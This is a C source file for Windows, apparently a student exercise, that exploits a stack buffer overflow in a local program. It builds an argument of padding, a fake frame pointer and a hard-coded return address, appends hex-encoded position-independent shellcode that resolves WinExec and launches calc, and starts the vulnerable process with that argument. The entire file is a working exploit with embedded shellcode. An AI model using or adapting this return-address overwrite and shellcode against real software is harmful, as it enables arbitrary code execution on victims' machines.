#include <stdio.h>
#include <stdlib.h>
#include<conio.h>
#include<windows.h>

//code of exploit  using to change return address 
//in the result of perform this code shellcode can be pop from stack and perform (part 2)

//path to defect application

#define BAD_APP "C:\\Users\\tymot\\Desktop\\msc.exe\""

//shellcode in heksdecymal form  without null values
unsigned char shellcode[108]=
{
	0x83,0xEC,0x46,0x83,0xE4,0xF0,0x33,0xC9,0x64,0x8B,0x41,0x30,0x8B,0x40,0x0C,
	0x8B,0x40,0x1C,0xFF,0x30,0x58,0x8B,0x70,0x08,0x8B,0x5E,0x3C,0x03,0xDE,0x8B,
	0x53,0x78,0x03,0xD6,0x33,0xDB,0x8B,0x4A,0x20,0x03,0xCE,0x8B,0x42,0x1C,0x03,
	0xC6,0x8B,0x6A,0x24,0x03,0xEE,0x8B,0x11,0x03,0xD6,0x50,0x53,0xD1,0xE3,0x03,
	0xDD,0x0F,0xB7,0x1B,0x8B,0x04,0x98,0x03,0xC6,0x81,0x3A,0x57,0x69,0x6E,0x45,
	0x74,0x08,0x5B,0x58,0x81,0xC1,0x04,0x43,0xEB,0xDE,0x6A,0x05,0xC7,0x04,0x24,
	0x63,0x61,0x6C,0x63,0x33,0xC9,0x89,0x4C,0x24,0x04,0x54,0x68,0x12,0xCB,0x81,
	0x7C,0xFF,0xE0
};




int main(void)
{
	
	int i;
	char exploit_data[1024];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	
	//set the variables
	memset(&si,0,sizeof(STARTUPINFO));
	memset(&pi,0,sizeof(PROCESS_INFORMATION));
	memset((void*)&exploit_data,0,sizeof(exploit_data));
	
	//prepartaion of entrance chain
	i=strlen(BAD_APP);
	memcpy((void*)&exploit_data,BAD_APP,i);
	
	//overwrite the buffor(16 baits)
	memset((void*)&exploit_data[i],'A',16);
	
	
	i+=16;
	
	//value of frame pointer
	*(DWORD*)&exploit_data[i]='BBBB';
	
	i+=4;
	
	//new retunr address
	*(DWORD*)&exploit_data[i]=0x7c8369d8;
	
	//any value without 0
	*(DWORD*)&exploit_data[i+4]='CCCC';
	i+=8;
	
	//add shellcode
	memcpy((void*)&exploit_data[i],(void*)&shellcode,sizeof(shellcode));
	i+=sizeof(shellcode);
	
	exploit_data[i]='"';
	
	//launch procces with parameter
	
	if(CreateProcess(NULL,&exploit_data,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)==NULL)
	{
		printf("Error can not run the process");
		getch();
		return -1;
	}
	
	WaitForSingleObject(pi.hProcess,INFINITE);
	
	CloseHandle(pi.hProcess);
	
	CloseHandle(pi.hThread);
	
	return 0;
	
}

